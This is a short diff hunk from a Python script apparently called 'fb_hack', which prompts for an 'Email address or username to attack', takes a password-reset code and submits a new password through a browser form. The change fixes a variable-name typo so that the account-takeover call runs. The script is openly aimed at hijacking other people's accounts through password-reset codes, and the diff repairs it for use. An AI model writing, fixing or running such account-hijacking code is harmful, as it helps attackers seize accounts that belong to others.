@@ -147,4 +147,4 @@ def fb_hack(email, codex):
       browser.form['password_new'] = new
 ehack = input('Email address or username to attack:')
 reset = input('Code: ') or 99999999
-fb_hack(echack, reset)
+fb_hack(ehack, reset)
